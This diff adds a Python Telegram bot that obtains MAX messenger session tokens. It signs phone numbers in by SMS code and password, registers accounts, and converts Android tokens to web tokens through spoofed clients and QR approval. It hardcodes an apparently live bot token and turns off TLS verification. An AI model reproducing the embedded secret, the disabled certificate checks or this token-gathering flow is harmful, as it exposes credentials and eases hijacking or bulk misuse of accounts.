@@ -1,0 +1,1287 @@
+import os
+import json
+import asyncio
+import uuid
+import logging
+import time
+import ssl
+import socket
+import struct
+import msgpack
+import threading
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+
+try:
+    import lz4.block
+    HAS_LZ4 = True
+except ImportError:
+    HAS_LZ4 = False
+
+try:
+    import websocket
+except ImportError:
+    websocket = None
+
+# ==================== КОНФИГ ====================
+
+BOT_TOKEN = "8637559797:AAEMxPOzFA00IGB1jEBR6R3BAj39s2Xy2HY"
+ADMIN_ID = 6769546065  # Ваш Telegram ID
+
+logging.basicConfig(level=logging.INFO)
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher(storage=MemoryStorage())
+
+# ==================== MAX PROTOCOL (Android) ====================
+
+class Packet:
+    VERSION = 10
+    HEADER_SIZE = 10
+
+    def __init__(self, opcode: int, payload: bytes = b"", sequence: int = 0, cmd: int = 0):
+        self.version = self.VERSION
+        self.cmd = cmd
+        self.sequence = sequence
+        self.opcode = opcode
+        self.payload = payload
+
+    def to_bytes(self) -> bytes:
+        payload_bytes = self.payload
+        flags = 0
+        if HAS_LZ4 and len(payload_bytes) >= 32:
+            compressed = lz4.block.compress(payload_bytes, store_size=False)
+            if len(compressed) < len(payload_bytes):
+                flags = (len(payload_bytes) // len(compressed)) + 1
+                payload_bytes = compressed
+        body_len = len(payload_bytes)
+        flags_and_len = ((flags & 0xFF) << 24) | (body_len & 0x00FFFFFF)
+        header = struct.pack(">B B H H I", self.version, self.cmd, 
+                           self.sequence & 0xFFFF, self.opcode & 0xFFFF, flags_and_len)
+        return header + payload_bytes
+
+    @classmethod
+    def from_bytes(cls, data: bytes):
+        if len(data) < cls.HEADER_SIZE:
+            raise ValueError("Too short")
+        header = data[:cls.HEADER_SIZE]
+        version, cmd, sequence, opcode, flags_and_len = struct.unpack(">B B H H I", header)
+        flags = (flags_and_len >> 24) & 0xFF
+        body_len = flags_and_len & 0x00FFFFFF
+        
+        expected_total = cls.HEADER_SIZE + body_len
+        if len(data) < expected_total:
+            raise ValueError(f"Expected {expected_total} bytes, got {len(data)}")
+        
+        payload = data[cls.HEADER_SIZE:expected_total]
+        
+        if flags != 0 and HAS_LZ4:
+            try:
+                estimated_size = body_len * max(flags, 2)
+                payload = lz4.block.decompress(payload, uncompressed_size=estimated_size)
+            except Exception as e:
+                logging.debug(f"LZ4 decompress error: {e}")
+                pass
+        
+        return cls(opcode=opcode, payload=payload, sequence=sequence, cmd=cmd)
+
+class Opcode:
+    PING = 1
+    SESSION_INIT = 6
+    AUTH_REQUEST = 17
+    AUTH = 18
+    LOGIN = 19
+    AUTH_CONFIRM = 23
+    AUTH_QR_APPROVE = 290
+    AUTH_LOGIN_CHECK_PASSWORD = 115
+    LOGOUT = 20
+
+def pack(data: dict) -> bytes:
+    return msgpack.packb(data, use_bin_type=True)
+
+def unpack(data: bytes) -> dict:
+    try:
+        return msgpack.unpackb(data, raw=False, strict_map_key=False)
+    except Exception:
+        unpacker = msgpack.Unpacker(raw=False, strict_map_key=False)
+        unpacker.feed(data)
+        return next(unpacker)
+
+class MaxConnection:
+    HOST = "api.oneme.ru"
+    PORT = 443
+
+    def __init__(self):
+        self._sock = None
+        self._sequence = 0
+        self._lock = threading.Lock()
+        self._pending = {}
+        self._responses = {}
+        self._running = False
+        self._buffer = bytearray()
+
+    def connect(self) -> bool:
+        try:
+            plain = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            plain.settimeout(10)
+            plain.connect((self.HOST, self.PORT))
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            ctx.minimum_version = ssl.TLSVersion.TLSv1_3
+            self._sock = ctx.wrap_socket(plain, server_hostname=self.HOST)
+            self._sock.settimeout(5)
+            self._running = True
+            self._buffer = bytearray()
+            self._pending.clear()
+            self._responses.clear()
+            threading.Thread(target=self._reader, daemon=True).start()
+            return True
+        except Exception as e:
+            logging.error(f"Connection error: {e}")
+            return False
+
+    def close(self):
+        self._running = False
+        if self._sock:
+            try:
+                self._sock.close()
+            except:
+                pass
+            self._sock = None
+
+    def _reader(self):
+        while self._running and self._sock:
+            try:
+                chunk = self._sock.recv(8192)
+                if not chunk:
+                    break
+                self._buffer.extend(chunk)
+                self._parse()
+            except socket.timeout:
+                continue
+            except Exception:
+                break
+
+    def _parse(self):
+        while len(self._buffer) >= Packet.HEADER_SIZE:
+            header = bytes(self._buffer[:Packet.HEADER_SIZE])
+            _, _, seq, opcode, flags_and_len = struct.unpack(">B B H H I", header)
+            body_len = flags_and_len & 0x00FFFFFF
+            total = Packet.HEADER_SIZE + body_len
+            
+            if len(self._buffer) < total:
+                break
+            
+            data = bytes(self._buffer[:total])
+            self._buffer = self._buffer[total:]
+            
+            try:
+                packet = Packet.from_bytes(data)
+                if packet.sequence in self._pending:
+                    self._responses[packet.sequence] = packet
+                    self._pending[packet.sequence].set()
+            except Exception as e:
+                logging.debug(f"Parse error (skipping packet): {e}")
+                continue
+
+    def send(self, packet: Packet, wait=True):
+        with self._lock:
+            self._sequence = (self._sequence + 1) & 0xFFFF
+            packet.sequence = self._sequence
+            seq = packet.sequence
+            if wait:
+                event = threading.Event()
+                self._pending[seq] = event
+                self._responses.pop(seq, None)
+        self._sock.sendall(packet.to_bytes())
+        if not wait:
+            return None
+        if not self._pending[seq].wait(60):
+            self._pending.pop(seq, None)
+            raise TimeoutError(f"Timeout waiting for seq {seq}")
+        self._pending.pop(seq, None)
+        return self._responses.pop(seq, None)
+
+class MaxAuth:
+    def __init__(self, device_id=None):
+        self.conn = MaxConnection()
+        self.device_id = device_id or str(uuid.uuid4())
+        self.auth_token = None
+        self.login_token = None
+        self.track_id = None
+        self._phone = None
+
+    def connect(self) -> bool:
+        return self.conn.connect()
+
+    def close(self):
+        self.conn.close()
+
+    def session_init(self):
+        now_ms = int(time.time() * 1000)
+        payload = {
+            "clientSessionId": now_ms & 0x7FFFFFFF,
+            "mt_instanceid": str(uuid.uuid4()),
+            "userAgent": {
+                "deviceType": "ANDROID",
+                "appVersion": "26.17.1",
+                "osVersion": "Android 10",
+                "timezone": "Europe/Moscow",
+                "screen": "408dpi 1080x2292",
+                "pushDeviceType": "GCM",
+                "arch": "arm64-v8a",
+                "locale": "ru",
+                "buildNumber": 6712,
+                "deviceName": "Google Pixel 7",
+                "deviceLocale": "ru"
+            },
+            "deviceId": self.device_id
+        }
+        p = Packet(Opcode.SESSION_INIT, pack(payload))
+        self.conn.send(p)
+        try:
+            self.conn.send(Packet(Opcode.PING, pack({"interactive": True})), wait=False)
+        except:
+            pass
+
+    def start_auth(self, phone: str) -> bool:
+        self._phone = phone
+        p = Packet(Opcode.AUTH_REQUEST, pack({
+            "phone": phone, 
+            "type": "START_AUTH", 
+            "language": "ru"
+        }))
+        resp = self.conn.send(p)
+        data = unpack(resp.payload)
+        if data.get("token"):
+            self.auth_token = data["token"]
+            return True
+        return False
+
+    def verify_code(self, code: str) -> dict:
+        p = Packet(Opcode.AUTH, pack({
+            "verifyCode": code,
+            "token": self.auth_token,
+            "authTokenType": "CHECK_CODE"
+        }))
+        resp = self.conn.send(p)
+        data = unpack(resp.payload)
+        if "error" in data:
+            return {"error": data["error"]}
+        if "passwordChallenge" in data:
+            self.track_id = data["passwordChallenge"]["trackId"]
+            return {"needs_password": True}
+        if "presetAvatars" in data:
+            return {"needs_registration": True, "presetAvatars": data.get("presetAvatars", [])}
+        token_attrs = data.get("tokenAttrs", {})
+        if "LOGIN" in token_attrs:
+            ld = token_attrs["LOGIN"]
+            self.login_token = ld.get("token") if isinstance(ld, dict) else ld
+            return {"token": self.login_token}
+        return data
+
+    def check_password(self, password: str):
+        p = Packet(Opcode.AUTH_LOGIN_CHECK_PASSWORD, pack({
+            "trackId": self.track_id,
+            "password": password
+        }))
+        resp = self.conn.send(p)
+        data = unpack(resp.payload)
+        if "LOGIN" in data:
+            ld = data["LOGIN"]
+            self.login_token = ld.get("token") if isinstance(ld, dict) else ld
+            return self.login_token
+        token_attrs = data.get("tokenAttrs", {})
+        if "LOGIN" in token_attrs:
+            ld = token_attrs["LOGIN"]
+            self.login_token = ld.get("token") if isinstance(ld, dict) else ld
+            return self.login_token
+        return None
+
+    def login_by_token(self, token: str) -> dict:
+        payload = {
+            "token": token,
+            "deviceId": self.device_id,
+            "userAgent": {
+                "deviceType": "ANDROID",
+                "appVersion": "26.17.1",
+                "osVersion": "Android 10",
+                "timezone": "Europe/Moscow",
+                "screen": "408dpi 1080x2292",
+                "pushDeviceType": "GCM",
+                "arch": "arm64-v8a",
+                "locale": "ru",
+                "buildNumber": 6712,
+                "deviceName": "Google Pixel 7",
+                "deviceLocale": "ru"
+            }
+        }
+        p = Packet(Opcode.LOGIN, pack(payload))
+        resp = self.conn.send(p)
+        data = unpack(resp.payload)
+        
+        if isinstance(data, int):
+            wait_time = data
+            logging.warning(f"[LOGIN] Flood wait: {wait_time} seconds")
+            time.sleep(wait_time + 5)
+            return {"success": False, "error": f"Flood wait {wait_time}s"}
+        
+        if not isinstance(data, dict):
+            return {"success": False, "error": f"Unexpected response type: {type(data)}"}
+        
+        if "error" in data:
+            return {"success": False, "error": data["error"]}
+        return {"success": True, "token": data.get("token", token)}
+
+    def confirm_qr_scan(self, track_id: str, qr_link: str = None) -> dict:
+        payload = {"trackId": track_id}
+        if qr_link:
+            payload["qrLink"] = qr_link
+        p = Packet(Opcode.AUTH_QR_APPROVE, pack(payload))
+        resp = self.conn.send(p)
+        if not resp.payload or len(resp.payload) == 0:
+            return {}
+        try:
+            return unpack(resp.payload)
+        except:
+            return {}
+
+class MaxRegistration:
+    def __init__(self, device_id=None):
+        self.conn = MaxConnection()
+        self.device_id = device_id or str(uuid.uuid4())
+        self.auth_token = None
+
+    def connect(self) -> bool:
+        return self.conn.connect()
+
+    def close(self):
+        self.conn.close()
+
+    def session_init(self):
+        now_ms = int(time.time() * 1000)
+        payload = {
+            "clientSessionId": now_ms & 0x7FFFFFFF,
+            "mt_instanceid": str(uuid.uuid4()),
+            "userAgent": {
+                "deviceType": "ANDROID",
+                "appVersion": "26.17.1",
+                "osVersion": "Android 10",
+                "timezone": "Europe/Moscow",
+                "screen": "408dpi 1080x2292",
+                "pushDeviceType": "GCM",
+                "arch": "arm64-v8a",
+                "locale": "ru",
+                "buildNumber": 6712,
+                "deviceName": "Google Pixel 7",
+                "deviceLocale": "ru"
+            },
+            "deviceId": self.device_id
+        }
+        p = Packet(Opcode.SESSION_INIT, pack(payload))
+        self.conn.send(p, wait=False)
+        try:
+            self.conn.send(Packet(Opcode.PING, pack({"interactive": True})), wait=False)
+        except:
+            pass
+
+    def request_sms(self, phone: str) -> dict:
+        p = Packet(Opcode.AUTH_REQUEST, pack({
+            "phone": phone,
+            "type": "START_AUTH",
+            "language": "ru"
+        }))
+        resp = self.conn.send(p)
+        data = unpack(resp.payload)
+        if data.get("token"):
+            self.auth_token = data["token"]
+            return {"success": True, "token": self.auth_token}
+        return {"success": False, "error": data.get("error", "No token")}
+
+    def register(self, sms_code: str, first_name: str = "User") -> dict:
+        payload = {
+            "verifyCode": sms_code,
+            "token": self.auth_token,
+            "authTokenType": "CHECK_CODE",
+            "firstName": first_name,
+            "lastName": ""
+        }
+        p = Packet(Opcode.AUTH, pack(payload))
+        resp = self.conn.send(p)
+        data = unpack(resp.payload)
+
+        if "error" in data:
+            return {"success": False, "error": data["error"]}
+
+        token_attrs = data.get("tokenAttrs", {})
+        register_token = token_attrs.get("REGISTER", {}).get("token")
+
+        if not register_token:
+            return {"success": False, "error": "No REGISTER token"}
+
+        confirm_payload = {
+            "token": register_token,
+            "tokenType": "REGISTER",
+            "firstName": first_name,
+            "lastName": ""
+        }
+        p2 = Packet(Opcode.AUTH_CONFIRM, pack(confirm_payload))
+        resp2 = self.conn.send(p2)
+        data2 = unpack(resp2.payload)
+
+        if "error" in data2:
+            return {"success": False, "error": data2["error"]}
+
+        token_attrs = data2.get("tokenAttrs", {})
+        login_token = token_attrs.get("LOGIN", {}).get("token")
+
+        if login_token:
+            return {"success": True, "token": login_token}
+        if data2.get("token"):
+            return {"success": True, "token": data2["token"]}
+
+        return {"success": False, "error": "No LOGIN token"}
+
+# ==================== WEB QR ====================
+
+class WebQRDeviceLink:
+    USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
+
+    def __init__(self, phone=None, password=None):
+        self.phone = phone
+        self.device_id = str(uuid.uuid4())
+        self.track_id = None
+        self.qr_data = None
+        self.qr_link = None
+        self.token = None
+        self.ws = None
+        self.running = False
+        self.qr_received = threading.Event()
+        self.login_complete = threading.Event()
+        self.scan_detected = threading.Event()
+        self.password_required = threading.Event()
+        self._seq = 0
+        self._session_id = None
+        self._expires_at = None
+        self._password_challenge = None
+        self._password = password
+        self._lock = threading.Lock()
+
+    def get_seq(self):
+        with self._lock:
+            s = self._seq
+            self._seq += 1
+            return s
+
+    def generate_and_wait(self, timeout=120, password=None):
+        if not websocket:
+            return None, None
+        
+        if password:
+            self._password = password
+        
+        self.running = True
+        self._seq = 0
+        self._session_id = int(time.time() * 1000)
+
+        def on_message(ws, message):
+            try:
+                data = json.loads(message)
+                payload = data.get("payload", {})
+                opcode = data.get("opcode")
+                cmd = data.get("cmd")
+
+                if opcode == 6 and cmd == 1:
+                    logging.info("[QR] Handshake confirmed")
+
+                elif opcode == 288 and cmd == 1:
+                    self.qr_link = payload.get("qrLink")
+                    self.qr_data = payload.get("qrData")
+                    self.track_id = payload.get("trackId")
+                    self._expires_at = payload.get("expiresAt")
+                    logging.info(f"[QR] QR received! Track ID: {self.track_id}")
+                    self._send_events(ws)
+                    self.qr_received.set()
+                    self._check_qr_status(ws)
+
+                elif opcode == 288 and cmd == 3:
+                    error = payload.get("error", "Unknown")
+                    logging.error(f"[QR] QR error: {error}")
+                    self.running = False
+                    ws.close()
+
+                elif opcode == 289 and cmd == 1:
+                    status = payload.get("status", {})
+                    if status.get("loginAvailable"):
+                        logging.info("[QR] QR scanned!")
+                        self.scan_detected.set()
+                        self._request_token(ws)
+                    elif not self.scan_detected.is_set() and not self.password_required.is_set():
+                        threading.Timer(2.0, lambda: self._check_qr_status(ws)).start()
+
+                elif opcode == 291 and cmd == 1:
+                    if "passwordChallenge" in payload:
+                        self._password_challenge = payload["passwordChallenge"]
+                        if self._password:
+                            logging.info("[QR] Auto-sending password immediately!")
+                            request = {
+                                "seq": self.get_seq(), "opcode": 115,
+                                "payload": {"trackId": self.track_id, "password": self._password},
+                                "ver": 11, "cmd": 0
+                            }
+                            ws.send(json.dumps(request))
+                        else:
+                            logging.info("[QR] 2FA password required!")
+                            self.password_required.set()
+                    elif "tokenAttrs" in payload:
+                        token_data = payload["tokenAttrs"].get("LOGIN", {})
+                        self.token = token_data.get("token")
+                        if self.token:
+                            self._send_login(ws, self.token)
+                            self.login_complete.set()
+                            self.running = False
+                            ws.close()
+
+                elif opcode == 115 and cmd == 1:
+                    if "tokenAttrs" in payload:
+                        token_data = payload["tokenAttrs"].get("LOGIN", {})
+                        self.token = token_data.get("token")
+                        if self.token:
+                            self._send_login(ws, self.token)
+                            self.login_complete.set()
+                            self.running = False
+                            ws.close()
+                    else:
+                        logging.error("[QR] 2FA error - wrong password")
+                        self.running = False
+                        ws.close()
+
+                elif opcode == 5 and cmd == 1:
+                    logging.debug("[QR] Events confirmed")
+
+                elif opcode == 1:
+                    pong = {"seq": self.get_seq(), "opcode": 1, "payload": {}, "ver": 11, "cmd": 0}
+                    ws.send(json.dumps(pong))
+
+            except Exception as e:
+                logging.error(f"[QR] Error: {e}")
+
+        def on_open(ws):
+            handshake = {
+                "seq": self.get_seq(), "opcode": 6,
+                "payload": {
+                    "userAgent": {
+                        "deviceType": "WEB",
+                        "locale": "ru",
+                        "deviceLocale": "ru",
+                        "osVersion": "Linux x86_64",
+                        "deviceName": "Chrome",
+                        "headerUserAgent": self.USER_AGENT,
+                        "appVersion": "26.5.10",
+                        "screen": "1920x1080 1.0x",
+                        "timezone": "Europe/Moscow",
+                        "buildNumber": 26172
+                    },
+                    "deviceId": self.device_id
+                },
+                "ver": 11, "cmd": 0
+            }
+            ws.send(json.dumps(handshake))
+            time.sleep(1)
+            qr_request = {"seq": self.get_seq(), "opcode": 288, "payload": {}, "ver": 11, "cmd": 0}
+            ws.send(json.dumps(qr_request))
+
+        def on_close(ws, code, msg):
+            logging.info(f"[QR] WebSocket closed: {code}, {msg}")
+            self.running = False
+
+        def on_error(ws, error):
+            logging.error(f"[QR] WebSocket error: {error}")
+
+        self.ws = websocket.WebSocketApp(
+            "wss://ws-api.oneme.ru/websocket",
+            on_open=on_open,
+            on_message=on_message,
+            on_close=on_close,
+            on_error=on_error,
+            header=[
+                "Origin: https://web.max.ru",
+                f"User-Agent: {self.USER_AGENT}"
+            ]
+        )
+
+        ws_thread = threading.Thread(
+            target=self.ws.run_forever,
+            kwargs={"sslopt": {"cert_reqs": ssl.CERT_NONE}}
+        )
+        ws_thread.daemon = True
+        ws_thread.start()
+
+        ping_thread = threading.Thread(target=self._ping_loop, daemon=True)
+        ping_thread.start()
+
+        if not self.qr_received.wait(30):
+            return None, None
+
+        if self.login_complete.wait(timeout):
+            return self.qr_data or self.qr_link, self.token
+
+        if self.password_required.wait(timeout):
+            return self.qr_data or self.qr_link, None
+
+        return self.qr_data or self.qr_link, None
+
+    def _ping_loop(self):
+        while self.running:
+            time.sleep(25)
+            if not self.running or not self.ws:
+                break
+            try:
+                ping = {"seq": self.get_seq(), "opcode": 1, "payload": {}, "ver": 11, "cmd": 0}
+                self.ws.send(json.dumps(ping))
+            except:
+                break
+
+    def _send_events(self, ws):
+        now_ms = int(time.time() * 1000)
+        events = {
+            "seq": self.get_seq(), "opcode": 5,
+            "payload": {
+                "events": [
+                    {
+                        "type": "NAV", "userId": -1, "time": now_ms,
+                        "sessionId": self._session_id, "event": "COLD_START",
+                        "params": {"action_id": 1, "screen_to": 49}
+                    },
+                    {
+                        "event": "LOG", "type": "AUTH_QR", "time": now_ms + 100,
+                        "userId": -1, "sessionId": self._session_id,
+                        "params": {"qr_ts_ms": self._expires_at, "action": "web_qr_view"}
+                    },
+                    {
+                        "type": "NAV", "userId": -1, "time": now_ms + 200,
+                        "sessionId": self._session_id, "event": "GO",
+                        "params": {"action_id": 2, "screen_to": 1, "screen_from": 49, "prev_time": now_ms}
+                    }
+                ]
+            },
+            "ver": 11, "cmd": 0
+        }
+        try:
+            ws.send(json.dumps(events))
+        except Exception as e:
+            logging.error(f"[QR] Events error: {e}")
+
+    def _check_qr_status(self, ws):
+        if not self.running or self.login_complete.is_set() or self.scan_detected.is_set():
+            return
+        try:
+            check = {
+                "seq": self.get_seq(), "opcode": 289,
+                "payload": {"trackId": self.track_id},
+                "ver": 11, "cmd": 0
+            }
+            ws.send(json.dumps(check))
+        except Exception as e:
+            logging.error(f"[QR] Status check error: {e}")
+
+    def _request_token(self, ws):
+        try:
+            request = {
+                "seq": self.get_seq(), "opcode": 291,
+                "payload": {"trackId": self.track_id},
+                "ver": 11, "cmd": 0
+            }
+            ws.send(json.dumps(request))
+        except Exception as e:
+            logging.error(f"[QR] Token request error: {e}")
+
+    def _send_login(self, ws, token):
+        login = {
+            "ver": 11, "cmd": 0, "seq": self.get_seq(),
+            "opcode": 19,
+            "payload": {
+                "token": token,
+                "chatsCount": 40,
+                "interactive": True,
+                "chatsSync": 0,
+                "contactsSync": 0,
+                "presenceSync": -1,
+                "draftsSync": 0
+            }
+        }
+        ws.send(json.dumps(login))
+        logging.info("[QR] LOGIN sent")
+
+    def close(self):
+        self.running = False
+        if self.ws:
+            try:
+                self.ws.close()
+            except:
+                pass
+
+# ==================== LOGOUT ANDROID ====================
+
+def logout_android(token: str, device_id: str) -> bool:
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        sock.connect(("api.oneme.ru", 443))
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        sock = ctx.wrap_socket(sock, server_hostname="api.oneme.ru")
+
+        sock.sendall(Packet(Opcode.SESSION_INIT, pack({
+            "clientSessionId": 2,
+            "mt_instanceid": uuid.uuid4().hex,
+            "userAgent": {
+                "deviceType": "ANDROID", "appVersion": "26.16.4",
+                "osVersion": "Android 10", "timezone": "Europe/Moscow",
+                "screen": "408dpi 1080x2292", "pushDeviceType": "GCM",
+                "arch": "arm64-v8a", "locale": "ru",
+                "buildNumber": 6704, "deviceName": "Google Pixel 7",
+                "deviceLocale": "ru"
+            },
+            "deviceId": device_id
+        })).to_bytes())
+        time.sleep(0.5)
+
+        sock.sendall(Packet(Opcode.LOGIN, pack({
+            "token": token, "deviceId": device_id,
+            "userAgent": {
+                "deviceType": "ANDROID", "appVersion": "26.16.4",
+                "osVersion": "Android 10", "timezone": "Europe/Moscow",
+                "screen": "408dpi 1080x2292", "pushDeviceType": "GCM",
+                "arch": "arm64-v8a", "locale": "ru",
+                "buildNumber": 6704, "deviceName": "Google Pixel 7",
+                "deviceLocale": "ru"
+            }
+        })).to_bytes())
+        time.sleep(1)
+
+        sock.sendall(Packet(Opcode.LOGOUT, pack({})).to_bytes())
+        time.sleep(0.5)
+        sock.close()
+        return True
+    except Exception as e:
+        logging.error(f"[LOGOUT] Error: {e}")
+        return False
+
+# ==================== КОНВЕРТАЦИЯ ANDROID → WEB ====================
+
+def convert_android_to_web(android_token: str, device_id: str = None, 
+                           phone: str = None, password: str = None) -> dict:
+    """
+    Конвертирует Android токен в WEB токен
+    Возвращает словарь с результатом в том же формате, что и в accounts.json
+    """
+    result = {
+        "success": False,
+        "web_token": None,
+        "device_id": device_id or "unknown",
+        "qr_data": None,
+        "error": None,
+        "token": android_token  # сохраняем оригинальный токен
+    }
+
+    qr_link = WebQRDeviceLink(phone=phone, password=password)
+    if device_id:
+        qr_link.device_id = device_id
+
+    qr_result = {"qr": None, "token": None}
+
+    def run_qr():
+        qr_result["qr"], qr_result["token"] = qr_link.generate_and_wait(timeout=120, password=password)
+
+    qr_thread = threading.Thread(target=run_qr)
+    qr_thread.start()
+
+    if not qr_link.qr_received.wait(30):
+        qr_link.close()
+        result["error"] = "QR generation timeout"
+        return result
+
+    result["qr_data"] = qr_link.qr_data or qr_link.qr_link
+    result["device_id"] = qr_link.device_id
+
+    logging.info(f"[CONVERT] Approving QR via Android API...")
+    time.sleep(3)
+
+    android = MaxAuth(device_id=device_id)
+    if not android.connect():
+        qr_link.close()
+        result["error"] = "Android connection failed"
+        return result
+
+    try:
+        android.session_init()
+        time.sleep(0.5)
+        
+        login_res = android.login_by_token(android_token)
+        if not login_res.get("success"):
+            logging.warning(f"[CONVERT] Login warning: {login_res.get('error')}")
+        
+        time.sleep(1)
+        
+        approve_res = android.confirm_qr_scan(qr_link.track_id, qr_link.qr_link)
+        logging.info(f"[CONVERT] Approve result: {approve_res}")
+        time.sleep(2)
+
+    except Exception as e:
+        logging.error(f"[CONVERT] Android error: {e}")
+    finally:
+        android.close()
+
+    qr_thread.join(timeout=120)
+
+    if qr_link.login_complete.is_set() and qr_link.token:
+        result["success"] = True
+        result["web_token"] = qr_link.token
+        logging.info("[CONVERT] Logging out from Android...")
+        logout_android(android_token, device_id or qr_link.device_id)
+    elif qr_link.password_required.is_set():
+        result["error"] = "2FA_PASSWORD_REQUIRED"
+    else:
+        result["error"] = "WEB token timeout"
+
+    qr_link.close()
+    return result
+
+# ==================== СОСТОЯНИЯ ====================
+
+class AuthState(StatesGroup):
+    waiting_for_phone = State()
+    waiting_for_code = State()
+    waiting_for_password = State()
+
+# Хранилище сессий
+pending = {}
+
+# ==================== КЛАВИАТУРЫ ====================
+
+def get_main_keyboard():
+    builder = InlineKeyboardBuilder()
+    builder.row(InlineKeyboardButton(text="📱 Получить токен", callback_data="get_token"))
+    builder.row(InlineKeyboardButton(text="🔄 Конвертировать в WEB", callback_data="convert_web"))
+    return builder.as_markup()
+
+def get_back_keyboard():
+    builder = InlineKeyboardBuilder()
+    builder.row(InlineKeyboardButton(text="🔙 Отмена", callback_data="cancel"))
+    return builder.as_markup()
+
+# ==================== ХЕНДЛЕРЫ ====================
+
+@dp.message(F.text == "/start")
+async def start_handler(message: types.Message):
+    await message.answer(
+        "🤖 <b>Бот для получения токенов</b>\n\n"
+        "📱 <b>Получить токен</b> - авторизация номера через SMS\n"
+        "🔄 <b>Конвертировать в WEB</b> - конвертация Android токена в WEB\n\n"
+        "Форматы токенов такие же как в основном боте:\n"
+        "<code>token, device_id, web_token, password</code>\n\n"
+        "Выберите действие:",
+        parse_mode="HTML",
+        reply_markup=get_main_keyboard()
+    )
+
+@dp.callback_query(F.data == "cancel")
+async def cancel_handler(callback: types.CallbackQuery, state: FSMContext):
+    uid = callback.from_user.id
+    if uid in pending:
+        auth = pending[uid].get("auth")
+        if auth:
+            auth.close()
+        del pending[uid]
+    await state.clear()
+    await callback.message.edit_text("❌ Действие отменено", reply_markup=get_main_keyboard())
+    await callback.answer()
+
+@dp.callback_query(F.data == "get_token")
+async def get_token_handler(callback: types.CallbackQuery, state: FSMContext):
+    await state.set_state(AuthState.waiting_for_phone)
+    await callback.message.edit_text(
+        "📱 Отправьте номер телефона в формате <b>+79111111111</b>",
+        parse_mode="HTML",
+        reply_markup=get_back_keyboard()
+    )
+    await callback.answer()
+
+@dp.message(AuthState.waiting_for_phone, F.text.regexp(r'^\+7\d{10}$'))
+async def phone_handler(message: types.Message, state: FSMContext):
+    phone = message.text.strip()
+    uid = message.from_user.id
+    
+    # Очищаем предыдущую сессию если есть
+    if uid in pending:
+        old_auth = pending[uid].get("auth")
+        if old_auth:
+            old_auth.close()
+    
+    auth = MaxAuth()
+    pending[uid] = {"auth": auth, "phone": phone, "status": "waiting_sms"}
+    await state.update_data(phone=phone)
+    
+    msg = await message.answer("⏳ Подключаюсь к серверу...")
+    
+    def do_auth():
+        try:
+            if not auth.connect():
+                pending[uid]["status"] = "error:connection_failed"
+                return
+            auth.session_init()
+            time.sleep(0.5)
+            if not auth.start_auth(phone):
+                pending[uid]["status"] = "error:sms_failed"
+                return
+            pending[uid]["status"] = "sms_sent"
+        except Exception as e:
+            pending[uid]["status"] = f"error:{e}"
+    
+    threading.Thread(target=do_auth, daemon=True).start()
+    await asyncio.sleep(5)
+    
+    if uid not in pending:
+        return
+    
+    status = pending[uid].get("status", "")
+    
+    if status == "sms_sent":
+        await state.set_state(AuthState.waiting_for_code)
+        await msg.edit_text("✅ SMS отправлена. Введите код из 6 цифр:")
+    elif status and status.startswith("error:"):
+        err_text = status[6:]
+        await msg.edit_text(f"❌ Ошибка: {err_text}", reply_markup=get_main_keyboard())
+        auth.close()
+        del pending[uid]
+        await state.clear()
+    else:
+        await state.set_state(AuthState.waiting_for_code)
+        await msg.edit_text("⏳ Ожидание SMS... Введите код из 6 цифр:")
+
+@dp.message(AuthState.waiting_for_code, F.text.regexp(r'^\d{6}$'))
+async def code_handler(message: types.Message, state: FSMContext):
+    uid = message.from_user.id
+    if uid not in pending:
+        await message.answer("⏳ Сессия устарела. Нажмите /start")
+        return
+    
+    data = await state.get_data()
+    phone = data.get("phone", "")
+    code = message.text.strip()
+    auth = pending[uid].get("auth")
+    
+    if not auth:
+        await message.answer("⏳ Сессия устарела. Нажмите /start")
+        return
+    
+    msg = await message.answer("⏳ Проверяю код...")
+    
+    result = None
+    def do_verify():
+        nonlocal result
+        try:
+            result = auth.verify_code(code)
+        except Exception as e:
+            result = {"error": str(e)}
+    
+    threading.Thread(target=do_verify, daemon=True).start()
+    await asyncio.sleep(3)
+    
+    if not result:
+        await asyncio.sleep(5)
+    
+    if not result:
+        await msg.edit_text("❌ Таймаут проверки кода.", reply_markup=get_main_keyboard())
+        auth.close()
+        del pending[uid]
+        await state.clear()
+        return
+    
+    if "error" in result:
+        err = str(result["error"]).lower()
+        if "wrong" in err or "invalid" in err:
+            await msg.edit_text("❌ Неверный код. Попробуйте ещё раз.")
+            return
+        await msg.edit_text(f"❌ Ошибка: {result['error']}", reply_markup=get_main_keyboard())
+        auth.close()
+        del pending[uid]
+        await state.clear()
+        return
+    
+    if result.get("needs_password"):
+        pending[uid]["track_id"] = auth.track_id
+        await state.set_state(AuthState.waiting_for_password)
+        await msg.edit_text("🔐 Требуется пароль 2FA. Введите пароль:")
+        return
+    
+    if result.get("needs_registration"):
+        pending[uid]["status"] = "registering"
+        pending[uid]["auth_token"] = auth.auth_token
+        
+        def do_register():
+            try:
+                reg = MaxRegistration(device_id=auth.device_id)
+                if not reg.connect():
+                    pending[uid]["status"] = "error:registration_connection"
+                    return
+                reg.session_init()
+                time.sleep(0.5)
+                reg.auth_token = auth.auth_token
+                reg_result = reg.register(code, "User")
+                reg.close()
+                
+                if reg_result.get("success"):
+                    pending[uid]["token"] = reg_result["token"]
+                    pending[uid]["device_id"] = reg.device_id
+                    pending[uid]["status"] = "done"
+                else:
+                    pending[uid]["status"] = f"error:{reg_result.get('error', 'registration_failed')}"
+            except Exception as e:
+                pending[uid]["status"] = f"error:{e}"
+        
+        threading.Thread(target=do_register, daemon=True).start()
+        await msg.edit_text("⏳ Регистрирую аккаунт...")
+        
+        for _ in range(30):
+            await asyncio.sleep(1)
+            if uid not in pending:
+                return
+            status = pending[uid].get("status", "")
+            if status == "done":
+                break
+            if status and status.startswith("error:"):
